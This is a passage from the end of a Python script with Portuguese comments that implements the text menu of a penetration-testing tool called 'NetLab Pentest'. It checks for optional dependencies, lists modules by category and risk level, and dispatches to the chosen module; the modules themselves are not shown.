    Aplica heurística de visibilidade do status do sistema (Nielsen H1).
    """
    ausentes = []
    if not _AIOHTTP_OK:
        ausentes.append("aiohttp")
    if not _REQUESTS_OK:
        ausentes.append("requests")
    if not _RICH_OK:
        ausentes.append("rich")

    if "aiohttp" in ausentes or "requests" in ausentes:
        aviso("Dependências críticas ausentes — funcionalidade reduzida:")
        if "aiohttp" in ausentes:
            print(f"    {_VERM}✗ aiohttp{_RESET}   — módulos 1, 2, 3 e 7 operam em modo degradado")
        if "requests" in ausentes:
            print(f"    {_VERM}✗ requests{_RESET}  — maioria dos módulos indisponível")
        print(f"\n    Instale com: {_BOLD}pip install {' '.join(ausentes)}{_RESET}\n")
    elif "rich" in ausentes:
        print(f"  {_DIM}· rich não instalado — interface em modo texto simples "
              f"(pip install rich para visualização aprimorada){_RESET}\n")


# ══════════════════════════════════════════════════════════════════════════════
# Menu principal
# ══════════════════════════════════════════════════════════════════════════════

def _exibir_menu_modulos() -> None:
    """
    Exibe o menu principal com categorias, descrições e níveis de risco.
    Aplica as heurísticas de reconhecimento em vez de memorização (H6)
    e design minimalista com hierarquia clara (H8).
    """
    # ── Categoria: Reconhecimento ──────────────────────────────────────────────
    print(f"  {_DIM}── Reconhecimento {'─' * 44}{_RESET}")
    for chave, (nome, _, categoria, risco, descricao) in _MODULOS.items():
        if categoria == "RECONHECIMENTO":
            cor_risco = _CORES_RISCO.get(risco, _CIANO)
            print(f"    {_BOLD}{chave:>2}{_RESET}  {_CIANO}{nome:<32}{_RESET}"
                  f" {cor_risco}[{risco}]{_RESET}")
            print(f"          {_DIM}{descricao}{_RESET}")

    # ── Categoria: Demonstração ────────────────────────────────────────────────
    print(f"\n  {_DIM}── Demonstração {'─' * 46}{_RESET}")
    for chave, (nome, _, categoria, risco, descricao) in _MODULOS.items():
        if categoria == "DEMONSTRAÇÃO":
            cor_risco = _CORES_RISCO.get(risco, _CIANO)
            print(f"    {_BOLD}{chave:>2}{_RESET}  {_CIANO}{nome:<32}{_RESET}"
                  f" {cor_risco}[{risco}]{_RESET}")
            print(f"          {_DIM}{descricao}{_RESET}")

    # ── Categoria: Ofensivo ────────────────────────────────────────────────────
    print(f"\n  {_DIM}── Ofensivo {'─' * 50}{_RESET}")
    for chave, (nome, _, categoria, risco, descricao) in _MODULOS.items():
        if categoria == "OFENSIVO":
            cor_risco = _CORES_RISCO.get(risco, _CIANO)
            print(f"    {_BOLD}{chave:>2}{_RESET}  {_CIANO}{nome:<32}{_RESET}"
                  f" {cor_risco}[{risco}]{_RESET}")
            print(f"          {_DIM}{descricao}{_RESET}")

    print(f"\n    {_BOLD} 0{_RESET}  {_DIM}Sair{_RESET}\n")


def menu_principal() -> None:
    """
    Loop principal do menu com navegação clara e feedback de erro contextual.
    Implementa as heurísticas de Nielsen: H1 (visibilidade), H3 (controle),
    H4 (consistência), H6 (reconhecimento), H8 (design minimalista).
    """
    while True:
        limpar_tela()
        banner()
        _checar_deps()

        if _RICH_OK and console:
            console.print("[bold cyan]  Selecione o módulo:[/bold cyan]")
        else:
            print(f"  {_CIANO}{_BOLD}Selecione o módulo:{_RESET}")

        _exibir_menu_modulos()

        opcao = input(f"  {_CIANO}Módulo{_RESET} [0–10]: ").strip()

        if opcao == "0":
            info("Encerrando o NetLab Pentest.")
            info("Nenhuma operação ficou pendente.")
            print()
            sys.exit(0)

        if opcao not in _MODULOS:
            erro(f"Opção '{opcao}' não é válida.")
            dica("Digite um número entre 0 e 10 e pressione Enter.")
            time.sleep(1.5)
            continue

        nome_mod, ClasseMod, categoria, risco, descricao = _MODULOS[opcao]

        print(f"\n  {_BOLD}Módulo selecionado: {nome_mod}{_RESET}")
        print(f"  {_DIM}{descricao}{_RESET}\n")

        try:
            mod = ClasseMod()
            mod.executar_interativo()
        except KeyboardInterrupt:
            aviso("\n  Módulo interrompido pelo usuário.")
            info("Nenhuma operação incompleta ficou pendente.")

        input(f"\n  {_CIANO}Pressione Enter para voltar ao menu principal...{_RESET}")


# ══════════════════════════════════════════════════════════════════════════════
# Ponto de entrada
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        menu_principal()
    except KeyboardInterrupt:
        print()
        aviso("Encerrando via Ctrl+C.")
        info("Nenhuma operação incompleta ficou pendente.")
        print()
        sys.exit(0)